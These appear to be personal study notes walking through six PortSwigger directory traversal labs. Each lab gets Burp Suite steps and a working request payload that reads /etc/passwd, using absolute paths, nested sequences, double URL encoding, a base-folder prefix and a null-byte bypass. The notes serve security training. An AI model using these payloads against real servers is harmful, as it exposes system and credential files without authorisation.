# Portswigger
## Directory Traversal
### File path traversal, simple case
```bash

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "View details"

Forward the proxy twice until you see:

GET /image?filename=53.jpg HTTP/1.

Send to Repeater

GET /image?filename=../../../../etc/passwd HTTP/1.1

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220502215316.png)
![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220502215543.png)
![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220502215820.png)
![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220502215946.png)

### File path traversal, traversal sequences blocked with absolute path bypass
```bash

- use absolute path

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "View details"

Forward the proxy twice until you see:

GET /image?filename=53.jpg HTTP/1.

Send to Repeater

GET /image?filename=/etc/passwd HTTP/1.1


```

### File path traversal, traversal sequences stripped non-recursively
```bash

- `using ..../ or ....\/`

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "View details"

Forward the proxy twice until you see:

GET /image?filename=53.jpg HTTP/1.```bash


Send to Repeater

GET /image?filename=....//....//....//....//etc/passwd HTTP/1.1


```

### File path traversal, traversal sequences stripped with superfluous URL-decode
```bash

- non-standard URL encoding

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "View details"

Forward the proxy twice until you see:

GET /image?filename=53.jpg HTTP/1.

Send to Repeater

GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1

```

### File path traversal, validation of start of path
```bash

- base folder requirement "/var/www/images"

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "View details"

Forward the proxy twice until you see:

GET /image?filename=53.jpg HTTP/1.

Send to Repeater

GET /image?filename=/var/www/images/../../../../etc/passwd HTTP/1.1


```

### File path traversal, validation of file extension with null byte bypass
```bash

- if a file extension is expected you may be able to use a null byte prior to said extension to terminate the following extension (similar to a comment at the end of an sql statement)

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "View details"

Forward the proxy twice until you see:

GET /image?filename=53.jpg HTTP/1.

Send to Repeater

GET /image?filename=../../../../etc/passwd%00.jpg HTTP/1.1


```

#hacking
